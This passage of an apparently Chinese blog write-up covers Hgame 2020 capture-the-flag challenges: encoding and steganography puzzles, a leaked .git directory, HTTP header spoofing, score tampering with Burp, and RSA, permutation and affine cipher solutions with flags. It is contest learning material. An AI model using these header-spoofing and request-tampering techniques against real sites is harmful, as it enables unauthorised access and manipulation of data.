mfqojk0U9avjpc6p+0+u5OmCqvuU50zddEcminrV8dLndN2n91JU4VV96nOmbpoDs2U9avjpc5pu8/upKnCqvtU50xdNIdmyvrV8VLntN1nd9JUYdV9qnOmLppDM2X96nipc9rusztpqrDqPtU5UxfNoZmyfnW81Dlt99mdNFVYdZ/qnKmL5tBMWb86XuqctvvsTpoqrLpPdc7URXNopqxfHS91Ttt9didNFVbdpzpn6qI5NFPWr46XOqftPruTpgrr6vMWxh9K6N5iCBjCSMYfSujeYggYwkjGH0ro3mIIGMJIxh9K6N5iCBjCSMYfSujeYggYwkjGH0ro3mIIGMJIxh9K6N5iCBjCSMYfSujeYggYwkjGH0ro3o43hGQcg0o1NDXddSVroQRDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqCHaEG553YNyGIcyVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL257n9pfwCscwlbU5+nTpAf+BukUkHwCGAN9A3SKSDwBDgG+gbhHJB4AhwDdQt4jkA8AQ4BuoW0TyAWAI8A3ULSL5ADAE+AbqFpF8ABgCfAN1i0g+AAwBvtH+p+J2YYblSF1al7bdejhiJe92956thSHY+1TW5ehTWZsjVvJud+/ZWhiCvU9lXY4+lbU5YiXvdveerYUh2PtU1uXoU1mbI1bybnfv2VoYgr1PZV2OPpW1OWIl73b3nq2FIdj7VNbl6FNZmyNW8m5379laGIK9T2Vdjj6VtTliJe92956thSHY+1TW5ehTWZsjVvJud+/ZWhiCvU9lXY4+lbU5YiXvdveerYUh2PtU1uXoU1mbI1bybnfv2VpiQ1DGihYt9FBcenT30J1PnTNVs7UwhJ9IXTSXHt09dOdT50zVbC0M4SdSF82lR3cP3fnUOVM1WwtD+InURXPp0d1Ddz51zlTN1sIQfiJ10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</code></pre><p>一看结尾<code>==</code>，应该是base64编码，于是继续解密。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_signinProPlus.png" alt="base64解密"></p><p>噫是个PNG图片。加上头补全 <code>data:image/png;base64,</code>。草（一种植物），真会玩，是个二维码。</p><p>（也可以base64解密后保存为二进制文件然后打开。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_signinProPlus2.png" alt="二维码图片"></p><p>扫码得到flag：</p><p><code>hgame{3Nc0dInG_@lL_iN_0Ne!}</code></p><p>真的会玩2333（（<em>好，我也要整一个各种编码的嘻嘻嘻</em></p><blockquote><p><em>Reference:</em><br><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/kaisamima.php</a><br><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a>   </p></blockquote><hr><h3 id="每日推荐"><a href="#每日推荐" class="headerlink" title="每日推荐"></a>每日推荐</h3><p>得到一个<code>.pcapng</code>抓包文件，用Wireshark打开，查看http，发现应该是与wordpress博客相关。</p><p>利用“文件-导出对象-HTTP”，分析其中的对象。</p><p>结合题目提示</p><blockquote><p>ObjectNotFound正听着网易云每日推荐…</p></blockquote><p>发现了一个上传的网页——</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation1.png" alt="HTTP对象"></p><p>这是一个提交的表格，发现了上传的文件 <code>song.zip</code>，将其提取出来。</p><p>压缩包里果然是一首歌，且备注里提示是6位数字。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation2.png" alt="form"></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation3.png" alt="压缩包"></p><p>考虑到6位数字，直接就暴力破解好了。（其实还在抓包文件里找了老半天没找到（（（</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation4.png" alt="破解得到口令"></p><p>利用口令<code>759371</code>解压得到mp3文件。</p><p>一开始打开010editor找，没有。</p><p>foremost提取得到了封面图，也没有隐写。</p><p>看来在音频里了，猜想就是<strong>音频隐写</strong>嘛。</p><p>既然是MP3，先试试<code>MP3StegoDecode</code>，结果么得。</p><pre><code>the bit stream file I Love Mondays.mp3 is a BINARY fileHDR: s=FFF, id=1, l=1, ep=on, br=4, sf=3, pd=0, pr=0, m=0, js=0, c=0, o=0, e=0alg.=MPEG-1, layer=I, tot bitrate=128, sfrq=0.0mode=stereo, sblim=32, jsbd=32, ch=2[Frame    3]OpenTable: could not find tables/huffdecCheck local directory './tables/'Please check huffman table 'huffdec'</code></pre><p>上网找了一下，下了个音频处理软件<strong><em>Audacity</em></strong>。（免费开源跨平台，还不错</p><blockquote><p>Free, open source, cross-platform audio software. <em>Audacity</em> is an easy-to-use, multi-track audio editor and recorder for Windows, Mac OS X, GNU/Linux…</p></blockquote><p>查看频谱，得到flag：</p><p><code>hgame{I_love_EDM233}</code></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation5.png" alt="查看频谱图得到flag"></p><blockquote><p><strong><em>Electronic Dance Music</em></strong> <em>（电子舞曲）</em>可还行。</p><p>第一次做音频隐写的题，哇脑洞真大，太有意思了233333</p></blockquote><hr><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><p><a href="http://cosmos.hgame.n3ko.co/" target="_blank" rel="noopener">http://cosmos.hgame.n3ko.co/</a></p><p>先在网页里找了半天没找到emmm</p><p>后来发现，既然说<strong>版本管理工具</strong>，还有<strong>GitHub</strong>嘛。</p><p>那就构造<code>/.git/config</code>试试</p><p>果然——</p><pre><code>[core]    repositoryformatversion = 0    filemode = true    bare = false    logallrefupdates = true[remote "origin"]    url = https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc    fetch = +refs/heads/*:refs/remotes/origin/*</code></pre><p>好，这个GitHub仓库有戏！</p><p>访问一波，然后在commit里找到了flag。</p><p><img src="/2020/01/23/CTF_Hgame2020/web_Cosmos'sBlog.png" alt="web_Cosmos'sBlog"></p><p>base64解码得到flag</p><p><code>hgame{g1t_le@k_1s_danger0us_!!!!}</code></p><blockquote><p>/.git目录公开访问是挺危险的emmm  </p></blockquote><hr><h3 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h3><p><a href="http://kyaru.hgame.n3ko.co/" target="_blank" rel="noopener">http://kyaru.hgame.n3ko.co/ </a></p><p>直接访问，提示</p><blockquote><p>You need to come from <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a>.                    </p></blockquote><p>增加请求头: <code>Referer: https://vidar.club/</code>，重发后提示</p><blockquote><p>You need to visit it locally.                    </p></blockquote><p>增加请求头：<code>X-Forwarded-For: 127.0.0.1</code></p><blockquote><p>You need to use Cosmos Brower to visit.                    </p></blockquote><p>改UA：<code>User-Agent: Cosmos</code></p><blockquote><p>The flag will be updated after 2077, please wait for it patiently.                    </p></blockquote><p>根据响应头 <code>Last-Modified: Fri, 01 Jan 2077 00:00:00 GMT</code>，进行修改。把 <code>If-Unmodified-Since</code> 设置在 <code>Last-Modified</code> 之后就可以了。</p><p>增加请求头：<code>If-Unmodified-Since: Fri, 01 Jan 2077 00:00:00 GMT</code></p><p>得到flag</p><p><code>hgame{W0w!Your_heads_@re_s0_many!}</code>                    </p><blockquote><p>这题一波三折啊。</p><p>最后这个操作让我想到了ustc的hackgame里<code>信息安全 2077</code>那道题，然后回去看了一下233.</p><p><strong><em>Reference：</em></strong></p><p><a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md" target="_blank" rel="noopener">https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md</a></p></blockquote><hr><h3 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h3><p>cxk有点好玩2333</p><p><del>随便玩了一下觉得有点无聊（x</del></p><p>看了一下网页源代码，发现是用canvas画布画出来的，交互用的js，有点意思i。</p><p>然后打开了Burp Suite，抓个包看看吧。</p><p>发现游戏结束的时候会POST当前得分。</p><p>不够则提示</p><blockquote><p>Your score must more than 30000 , then you can get the flag. Happy game!</p></blockquote><p>那就截包改包好了啦，直接给他加个0.</p><p><img src="/2020/01/23/CTF_Hgame2020/web_cxk1.png" alt="改包"></p><p>这就出来了呀！</p><p><img src="/2020/01/23/CTF_Hgame2020/web_cxk2.png" alt="cxk2"></p><p>​    <code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></p><hr><h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><p><a href="http://codeworld.hgame.day-day.work/" target="_blank" rel="noopener">http://codeworld.hgame.day-day.work/</a></p><p>发现重定向到了 <a href="http://codeworld.hgame.day-day.work/new.php" target="_blank" rel="noopener">http://codeworld.hgame.day-day.work/new.php</a></p><p>同时看到了一句js</p><pre class=" language-javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"This new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!"</span><span class="token punctuation">)</span></code></pre><p>curl看了一下之前的网页405。</p><p>嘤不会了。。</p><blockquote><p><strong>20200125更新：</strong></p><p>看了官方WP，发现要把请求改成POST发到原页面。</p><p>于是试了一下，返回</p><pre><code>人鸡验证目前它只支持通过url提交参数来计算两个数的相加，参数为a现在,需要让结果为10</code></pre><p>再构造参数a，根据提示<code>参数a的提交格式为: 两数相加(a=b+c)</code>，考虑到<code>+</code>的Urlencode为%2b</p><p>于是构造<code>/?a=2%2b8</code>，得到flag</p><pre><code>The result is: 10hgame{C0d3_1s_s0_S@_sO_C0ol!}</code></pre></blockquote><hr><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>题目给了如下的代码——</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>b<span class="token string">'hgame{'</span><span class="token punctuation">)</span> <span class="token operator">and</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>b<span class="token string">'}'</span><span class="token punctuation">)</span>m <span class="token operator">=</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token number">681782737450022065655472455411</span>q <span class="token operator">=</span> <span class="token number">675274897132088253519831953441</span>e <span class="token operator">=</span> <span class="token number">13</span>c <span class="token operator">=</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">assert</span> c <span class="token operator">==</span> <span class="token number">275698465082361070145173688411496311542172902608559859019841</span></code></pre><p>RSA啦。这里就<strong>根据密文C把明文M给找出来</strong>。</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_InfantRSA.png" alt="InfantRSA"></p><pre class=" language-python"><code class="language-python">c <span class="token operator">=</span> <span class="token number">275698465082361070145173688411496311542172902608559859019841</span>n <span class="token operator">=</span> <span class="token number">460390767897997184102969941508880171690097589571068900519251</span>d <span class="token operator">=</span> <span class="token number">141658697814768364339375366617699419709389378231351875726277</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 得到m为39062110472669388914389428064087335236334831991333245</span><span class="token comment" spellcheck="true"># 再将数字m转换为字符串</span>    <span class="token keyword">import</span> binascii    flag <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>或者 用上面的工具里的<em>Test</em>：</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_InfantRSA2.png" alt="test"></p><p>得到flag：</p><p><code>hgame{t3Xt6O0k_R5A!!!}</code></p><blockquote><p><em>Reference:</em>  介绍RSA的<br><a href="https://www.freebuf.com/articles/others-articles/166049.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/166049.html</a><br><a href="https://www.freebuf.com/articles/others-articles/161475.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/161475.html</a><br><a href="https://www.k2zone.cn/?p=2157" target="_blank" rel="noopener">https://www.k2zone.cn/?p=2157</a></p></blockquote><hr><h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p><code>nc 47.98.192.231 25002</code></p><p>敲个回车就可以得到一个乱序的字符串，刚开始还以为是分组来着，然后试了半天不对emmm。</p><p>后来才发现，原来每次的结果都不一样233，比如下面是一些实验结果。</p><pre><code>Rua!!!$hLjgp+ame{UI5mtA3}u_!iP!RmTn0eT   Rua!!!$mtgIUeapjm{h+5LAeT_nTRP!u!m3i0}  Rua!!!t5m{ag+eh$UjILmpT0!mP_iR3ATun}e!  $mhmjI5te+{apUgLAe3!un0TRimP!T_}  mat5jIpmg$heLU{+!PT0un!e_A3R}Tmi  {LUpt5mI+e$mgajhm}T!T0!niRAe_Pu3  $Umm+g{LIe5jphtaAT!ei_m}nR0u!3TP  5I{eLmt+ha$mgpjU0nmR}eTi3PA!_!uT  Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R</code></pre><p><strong>既然是乱序吧，那就看看到底是什么个顺序好了！</strong></p><p>上面字符串的长度为32，于是构造字符串 </p><p><code>str1='123456abcdefghijklmnopqrstuvwxyz'</code></p><p>输入后得到 <code>str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo'</code>  </p><p>试了发现该顺序不变，于是得到编码的对应关系（正变换逆变换嘛233333）</p><pre class=" language-python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'123456abcdefghijklmnopqrstuvwxyz'</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span>str2<span class="token operator">=</span><span class="token string">'jhca1346ibdefg25zxsqkmnpyrtuvwlo'</span><span class="token comment" spellcheck="true"># 正变换</span>location<span class="token operator">=</span>list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    location<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>str1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [15, 13, 8, 6, 0, 2, 3, 5, 14, 7, 9, 10, 11, 12, 1, 4, 31, 29, 24, 22, 16, 18, 19, 21, 30, 23, 25, 26, 27, 28, 17, 20]</span><span class="token comment" spellcheck="true"># 逆变换</span>ilocation<span class="token operator">=</span>list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ilocation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>str2<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ilocation<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [4, 14, 5, 6, 15, 7, 3, 9, 2, 10, 11, 12, 13, 1, 8, 0, 20, 30, 21, 22, 31, 23, 19, 25, 18, 26, 27, 28, 29, 17, 24, 16]</span><span class="token comment" spellcheck="true"># 验证结果</span>str3<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>    str3<span class="token operator">+=</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str3<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#  jhca1346ibdefg25zxsqkmnpyrtuvwlo</span></code></pre><p>这里用到的是正变换，<strong>暴力破解</strong>一波吧！</p><pre class=" language-python"><code class="language-python">str_encrypted <span class="token operator">=</span> r<span class="token string">'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R'</span>str_decrypted <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>        str_decrypted <span class="token operator">+=</span> str_encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypted<span class="token punctuation">)</span>    str_encrypted <span class="token operator">=</span> str_decrypted    str_decrypted <span class="token operator">=</span> <span class="token string">''</span></code></pre><p>最开始试了50次没出来233，后来把数字改大了一点233.</p><p>终于跑出来了！</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_Reorder.png" alt="crypto_Reorder"></p><p><strong>得到flag：</strong></p><p><code>hgame{jU$t+5ImpL3_PeRmuTATi0n!!}</code></p><blockquote><p><strong>果然就排列呗23333</strong></p></blockquote><p>还试了一下，这个130次一循环来着emmm。就这样，发现range改到131就出现两个了。</p><pre class=" language-python"><code class="language-python">str_encrypted <span class="token operator">=</span> r<span class="token string">'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R'</span>str_decrypted <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">130</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>        str_decrypted <span class="token operator">+=</span> str_encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">if</span> str_decrypted<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'hgame'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypted<span class="token punctuation">)</span>    str_encrypted <span class="token operator">=</span> str_decrypted    str_decrypted <span class="token operator">=</span> <span class="token string">''</span></code></pre><p><strong>不对唉！</strong>好像没这么简单。重新试了一下之前的几个<code>Rua!!!</code>之后的结果，发现这个变换不可行emmm。</p><p><strong>必须是连续输入上一次出来的结果才行。<em>（可能理解有误</em></strong></p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_Reorder2.png" alt="crypto_Reorder2"></p><hr><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>题目给了这段用来加密的代码，现在就想办法还原回去找flag吧。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> secret <span class="token keyword">import</span> A<span class="token punctuation">,</span> B<span class="token punctuation">,</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'hgame{'</span><span class="token punctuation">)</span> <span class="token operator">and</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">)</span>TABLE <span class="token operator">=</span> <span class="token string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span>MOD <span class="token operator">=</span> len<span class="token punctuation">(</span>TABLE<span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> b <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        cipher <span class="token operator">+=</span> b    <span class="token keyword">else</span><span class="token punctuation">:</span>        ii <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">*</span>i <span class="token operator">+</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> MOD        cipher <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># A8I5z{xr1A_J7ha_vG_TpH410}</span></code></pre><p>提示了flag以 <code>hgame{</code> 开头，以 <code>}</code> 结尾，很明显能看出来<code>{ } _</code>这三个字符是找不到而直接加到cipher里的。</p><p>容易得到 MOD=62，于是乎思路就是，<strong>利用  <code>hgame</code> 与 <code>A8I5z</code> 的映射关系，把A和B两个参数给求解出来，再把参数i反解出来，最后把flag还原</strong>。</p><p>码代码吧。</p><pre class=" language-python"><code class="language-python">TABLE <span class="token operator">=</span> <span class="token string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span>MOD <span class="token operator">=</span> len<span class="token punctuation">(</span>TABLE<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 62</span>flag <span class="token operator">=</span> <span class="token string">'hgame'</span>cipher <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> b <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 求解得到对应的i</span><span class="token comment" spellcheck="true"># h 12</span><span class="token comment" spellcheck="true"># g 11</span><span class="token comment" spellcheck="true"># a 7</span><span class="token comment" spellcheck="true"># m 6</span><span class="token comment" spellcheck="true"># e 18</span>str_encrypt <span class="token operator">=</span> r<span class="token string">'A8I5z{xr1A_J7ha_vG_TpH410}'</span>iis <span class="token operator">=</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> str_encrypt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    iis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>index<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>letter<span class="token punctuation">,</span> iis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    i <span class="token 